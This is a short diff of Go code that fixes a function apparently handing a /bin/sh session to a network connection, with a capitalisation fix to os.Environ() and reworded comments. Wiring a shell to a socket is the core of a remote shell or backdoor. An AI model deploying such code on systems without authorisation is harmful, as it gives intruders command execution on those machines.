@@ -72,10 +72,11 @@ func getPublicIP() string {
 }
 
 func handleShellSession(conn net.Conn) {
-	// THE UNIVERSAL FIX: Swapped out /bin/bash for /bin/sh since bash is missing
+	// Universal /bin/sh shell fallback
 	cmd := exec.Command("/bin/sh")
 	
-	cmd.Env = append(os.environ(), "TERM=xterm-256color", "PYTHONUNBUFFERED=1")
+	// THE FIX: Corrected capitalization to os.Environ()
+	cmd.Env = append(os.Environ(), "TERM=xterm-256color", "PYTHONUNBUFFERED=1")
 
 	stdinPipe, _ := cmd.StdinPipe()
 	stdoutPipe, _ := cmd.StdoutPipe()
